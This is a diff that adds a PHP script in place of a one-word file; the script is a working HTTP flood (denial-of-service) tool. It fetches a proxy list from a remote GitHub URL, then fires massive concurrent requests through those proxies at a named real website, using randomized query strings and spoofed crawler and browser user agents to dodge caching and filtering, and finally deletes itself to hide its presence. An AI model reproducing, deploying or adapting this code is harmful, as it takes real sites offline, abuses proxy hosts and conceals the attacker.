@@ -1,1 +1,68 @@
-sad
+<?php
+@set_time_limit(10);
+function generateRandomString($length=10) {
+    $original_string = array_merge(range(0,9), range('a','z'), range('A', 'Z'));
+    $original_string = implode("", $original_string);
+    return substr(str_shuffle($original_string), 0, $length);
+}
+function getRandomUserAgent(){
+    $userAgents=array(
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",   
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",   
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",   
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",   
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",   
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",   
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",   
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",   
+        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",   
+        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",   
+        "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+    );
+    $random = rand(0,count($userAgents)-1);
+    return $userAgents[$random];
+}
+function getRandomReferer(){
+    $userAgents=array(
+        "https://www.google.com.tr/"
+    );
+    $random = rand(0,count($userAgents)-1);
+    return $userAgents[$random];
+}
+for($i=0;$i<999999;$i++){
+$thread = "9999";
+$open_file  =  file("https://raw.githubusercontent.com/webr00t/web/master/p.txt");
+$open_file  =  preg_replace("#\r\n#si","",$open_file);
+$multi   = curl_multi_init();
+$ips   = array_chunk($open_file,$thread);
+foreach($ips as $ip)
+{
+for($i=0;$i<=count($ip)-1;$i++)
+{
+$rand = generateRandomString(20);
+$url = "http://seslilerdeyiz.com/?s=$rand";
+      $curl[$i] = curl_init();
+      curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
+      curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,false);
+      curl_setopt($curl[$i],CURLOPT_USERAGENT,getRandomUserAgent());
+      curl_setopt($curl[$i],CURLOPT_REFERER,"https://www.google.com.tr/");
+      curl_setopt($curl[$i],CURLOPT_URL,$url);
+	  curl_setopt($curl[$i],CURLOPT_HTTPPROXYTUNNEL, 0);
+      curl_setopt($curl[$i],CURLOPT_PROXY, $ip[$i]);
+      curl_setopt($curl[$i],CURLOPT_TIMEOUT,1);
+      curl_multi_add_handle($multi,$curl[$i]);
+}
+      do
+{
+      curl_multi_exec($multi,$active);
+}while( $active > 0 );
+
+      foreach($curl as $cid => $cend)
+      {
+      }
+
+}
+}
+unlink(__FILE__);
+?>
